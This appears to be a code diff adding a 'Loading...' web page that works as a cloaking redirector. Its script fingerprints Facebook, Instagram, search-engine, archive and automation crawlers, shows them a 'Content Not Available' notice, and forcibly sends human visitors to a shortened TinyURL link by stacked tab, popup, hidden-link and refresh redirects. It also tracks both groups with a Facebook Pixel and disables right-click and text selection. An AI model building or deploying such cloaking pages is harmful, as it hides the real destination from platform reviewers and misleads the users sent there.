@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
+        }
+        
+        .loader-container {
+            text-align: center;
+            padding: 2rem;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        
+        .sub-text {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .bot-message {
+            display: none;
+            text-align: center;
+            padding: 2rem;
+        }
+        
+        .bot-message h2 {
+            margin-bottom: 1rem;
+        }
+        
+        .manual-link {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 25px;
+            margin-top: 20px;
+            transition: background 0.3s ease;
+        }
+        
+        .manual-link:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container" id="loader">
+        <div class="spinner"></div>
+        <div class="loading-text">Please wait...</div>
+        <div class="sub-text">Preparing your content</div>
+    </div>
+    
+    <div class="bot-message" id="botMessage">
+        <h2>Content Not Available</h2>
+        <p>This content is not accessible through automated systems.</p>
+        <a href="https://tinyurl.com/282992" class="manual-link">Continue Manually</a>
+    </div>
+
+    <!-- Facebook Pixel Code - Add your pixel ID here -->
+    <script>
+        // Replace 'YOUR_PIXEL_ID' with your actual Facebook Pixel ID
+        const PIXEL_ID = 'YOUR_PIXEL_ID';
+        
+        // Facebook Pixel Base Code
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+        
+        // Initialize pixel only if PIXEL_ID is set
+        if (PIXEL_ID !== 'YOUR_PIXEL_ID') {
+            fbq('init', PIXEL_ID);
+            fbq('track', 'PageView');
+        }
+    </script>
+    <!-- End Facebook Pixel Code -->
+
+    <script>
+        // Bot detection logic - More accurate, less aggressive
+        function detectBot() {
+            const botPatterns = [
+                /facebookexternalhit/i, /facebot/i, /facebook/i,
+                /instagram/i, /meta-externalagent/i,
+                /whatsappbot/i, /messenger/i,
+                /googlebot/i, /bingbot/i, /slurp/i,
+                /duckduckbot/i, /baiduspider/i, /yandexbot/i,
+                /twitterbot/i, /linkedinbot/i, /pinterestbot/i,
+                /bot/i, /crawler/i, /spider/i, /scraper/i,
+                /ia_archiver/i, /wayback/i, /archive/i,
+                /headless/i, /phantom/i, /selenium/i,
+                /automated/i, /curl/i, /wget/i, /python/i
+            ];
+            
+            const userAgent = navigator.userAgent || '';
+            
+            // Check user agent for bot patterns
+            for (let pattern of botPatterns) {
+                if (pattern.test(userAgent)) {
+                    return true;
+                }
+            }
+            
+            // Only check for very obvious automation signs
+            if (
+                navigator.webdriver === true ||
+                window.callPhantom ||
+                window._phantom
+            ) {
+                return true;
+            }
+            
+            return false;
+        }
+        
+        function isLikelyBot() {
+            // Very minimal checks to avoid false positives
+            try {
+                // Only flag if very obviously automated
+                if (navigator.userAgent === '' || !navigator.userAgent) {
+                    return true;
+                }
+                
+                // Check for completely missing basic properties
+                if (typeof window === 'undefined' || typeof document === 'undefined') {
+                    return true;
+                }
+            } catch (e) {
+                // If we can't check, assume it's a real user
+                return false;
+            }
+            
+            return false;
+        }
+        
+        function handleRedirect() {
+            const targetUrl = 'https://tinyurl.com/282992';
+            
+            // More lenient bot detection - only block obvious bots
+            const isBot = detectBot();
+            const likelyBot = isLikelyBot();
+            
+            // Only block if BOTH detection methods agree it's a bot
+            if (isBot && likelyBot) {
+                // Show bot message instead of redirecting
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('botMessage').style.display = 'block';
+                
+                // Track bot detection with Facebook Pixel
+                if (typeof fbq !== 'undefined') {
+                    fbq('trackCustom', 'BotDetected', {
+                        user_agent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    });
+                }
+                
+                return;
+            }
+            
+            // Real user or uncertain - perform automatic redirect
+            // Track real user with Facebook Pixel
+            if (typeof fbq !== 'undefined') {
+                fbq('track', 'Lead');
+                fbq('trackCustom', 'RealUserRedirect', {
+                    destination: targetUrl,
+                    timestamp: new Date().toISOString()
+                });
+            }
+            
+            // Method 1: Open in new tab (primary method)
+            const newTab = window.open(targetUrl, '_blank', 'noopener,noreferrer');
+            
+            // Method 2: Open in new window if tab blocked
+            if (!newTab) {
+                window.open(targetUrl, '_blank', 'width=800,height=600,scrollbars=yes,resizable=yes');
+            }
+            
+            // Method 3: Create and click invisible link (fallback)
+            const link = document.createElement('a');
+            link.href = targetUrl;
+            link.target = '_blank';
+            link.rel = 'noopener noreferrer';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // Method 4: Also redirect current page (backup)
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 500);
+        }
+        
+        // Additional verification through user interaction
+        let interactionDetected = false;
+        
+        function markInteraction() {
+            interactionDetected = true;
+        }
+        
+        // Listen for real user interactions
+        document.addEventListener('mousemove', markInteraction, { once: true });
+        document.addEventListener('scroll', markInteraction, { once: true });
+        document.addEventListener('keydown', markInteraction, { once: true });
+        document.addEventListener('click', markInteraction, { once: true });
+        document.addEventListener('touchstart', markInteraction, { once: true });
+        
+        // Start the process immediately when page loads
+        if (document.readyState === 'complete') {
+            handleRedirect();
+        } else {
+            window.addEventListener('load', handleRedirect);
+            // Also try on DOMContentLoaded for faster execution
+            document.addEventListener('DOMContentLoaded', handleRedirect);
+        }
+        
+        // Prevent right-click and other bot-like behaviors
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+        document.addEventListener('dragstart', e => e.preventDefault());
+    </script>
+    
+    <!-- Noscript fallback for users with JavaScript disabled -->
+    <noscript>
+        <meta http-equiv="refresh" content="3;url=https://tinyurl.com/282992">
+        <div style="text-align: center; padding: 2rem; color: white;">
+            <p>If you are not redirected automatically, <a href="https://tinyurl.com/282992" style="color: #fff;">click here</a>.</p>
+        </div>
+    </noscript>
+</body>
+</html>
